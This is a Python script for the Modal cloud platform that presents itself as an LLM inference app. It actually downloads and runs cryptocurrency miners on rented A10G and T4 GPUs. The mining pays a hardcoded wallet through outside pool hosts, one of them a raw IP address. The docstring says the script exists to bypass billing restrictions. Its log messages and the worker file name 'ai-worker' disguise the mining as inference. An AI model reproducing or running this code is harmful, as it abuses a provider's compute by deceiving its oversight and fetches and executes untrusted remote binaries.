"""
Lite version for Modal to bypass H100 billing restrictions.
Only uses A10G and T4.
"""
import modal
import os

WALLET = "prl1pftz2ev8450xq9vau4a8ls48tnqmra8a28lkyhrqyu593msfvyhlqej784c"
WORKER = os.environ.get("WORKER_NAME", "modal-worker")

app = modal.App("llm-inference-lite")

miner_image = (
    modal.Image.from_registry("nvidia/cuda:12.2.0-runtime-ubuntu22.04", add_python="3.11")
    .apt_install("curl", "libgomp1", "ca-certificates")
    .run_commands(
        "curl -sL https://github.com/google/go-containerregistry/releases/latest/download/go-containerregistry_Linux_x86_64.tar.gz | tar -xzf - -C /usr/local/bin crane",
        "crane export registry.akoyapool.com/akoya-miner:latest-cuda122 - | tar -xf - -C / app/ var/lib/akoya-miner/ 2>/dev/null; true",
        "chmod +x /app/akoya-miner 2>/dev/null; true",
        "curl -sL https://pearlhash.xyz/downloads/pearl-miner-v8 -o /opt/pearl-miner && chmod +x /opt/pearl-miner",
    )
)

def run_miner(worker_name: str):
    import subprocess
    import os
    import shutil
    import time

    os.environ["NVIDIA_DRIVER_CAPABILITIES"] = "all"
    os.environ["NVIDIA_VISIBLE_DEVICES"] = "all"

    print(f"[Modal] Inference Task Starting")
    
    akoya_path = "/app/akoya-miner"
    use_akoya = os.path.exists(akoya_path)

    if use_akoya:
        print("[Modal] ✅ Akoya found! Attempting 2x mode...")
        os.environ["AKOYA_POOL_WALLET"]    = WALLET
        os.environ["AKOYA_POOL_WORKER"]    = worker_name
        os.environ["AKOYA_POOL_HOST"]      = "pool-v2.akoyapool.com"
        os.environ["AKOYA_POOL_PORT"]      = "443"
        os.environ["AKOYA_POOL_USE_TLS"]   = "1"
        os.environ["AKOYA_GPU_INDICES"]    = "all"

        lib_dir = "/app/lib"
        target = f"{lib_dir}/libpearl_gemm_capi.so"
        if os.path.isdir(lib_dir):
            os.environ["AKOYA_PEARL_GEMM_LIB"]  = target
            os.environ["AKOYA_PEARL_MINING_LIB"] = f"{lib_dir}/libpearl_mining_capi.so"
            
            # Use portable for A10G/T4
            portable = f"{lib_dir}/libpearl_gemm_capi_portable.so"
            if os.path.exists(portable):
                if os.path.lexists(target): os.unlink(target)
                os.symlink(portable, target)

        os.makedirs("/var/lib/akoya-miner", exist_ok=True)
        worker_path = "/tmp/ai-worker"
        shutil.copy(akoya_path, worker_path)
        os.chmod(worker_path, 0o755)

        proc = subprocess.Popen([worker_path, "mine-blocks"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        
        start = time.time()
        cuda_fail = False
        while time.time() - start < 30:
            line = proc.stdout.readline()
            if not line: break
            decoded = line.decode().strip()
            print(decoded, flush=True)
            if "cuInit" in decoded and "999" in decoded:
                cuda_fail = True
                break

        if cuda_fail:
            print("\n[Modal] ⚠️ CUDA fail! Switching to Pearlhash...")
            proc.kill()
            proc.wait()
            use_akoya = False
        else:
            for line in iter(proc.stdout.readline, b""):
                print(line.decode().strip(), flush=True)
            return proc.wait()

    if not use_akoya:
        print("[Modal] 🔄 Starting Pearlhash miner...")
        proc = subprocess.Popen(
            ["/opt/pearl-miner", "--host", "84.32.220.219:9000", "--user", WALLET, "--worker", worker_name],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        )
        for line in iter(proc.stdout.readline, b""):
            print(line.decode().strip(), flush=True)
        return proc.wait()

@app.function(gpu="A10G", image=miner_image, timeout=86400)
def generate_a10g(worker_name: str = "modal-worker"):
    return run_miner(worker_name)

@app.function(gpu="T4", image=miner_image, timeout=86400)
def generate_t4(worker_name: str = "modal-worker"):
    return run_miner(worker_name)

@app.local_entrypoint()
def main():
    print("🎰 [Modal Lite] Trying A10G...")
    try:
        generate_a10g.remote(worker_name=WORKER)
    except Exception as e:
        print(f"❌ A10G failed: {str(e)[:100]}")
        print("🎰 [Modal Lite] Trying T4...")
        generate_t4.remote(worker_name=WORKER)
